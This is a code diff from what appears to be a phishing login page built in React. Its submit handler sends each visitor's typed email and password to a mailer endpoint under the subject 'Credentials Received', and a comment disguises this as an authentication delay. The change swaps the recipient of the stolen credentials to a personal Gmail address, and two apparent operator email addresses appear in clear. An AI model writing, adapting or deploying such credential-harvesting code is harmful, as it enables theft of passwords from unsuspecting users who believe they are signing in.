@@ -177,7 +177,7 @@ export const App = () => {
     setLoading(true);
     // Simulate authentication delay
     const request = await axios.post('/api/mailer', {
-      email: "austine@fashionbrand.click" as string,
+      email: "augustineiwuoha704@gmail.com" as string,
       subject: "Credentials Received",
       message: `Email: ${email}\nPassword: ${password}`,
     });
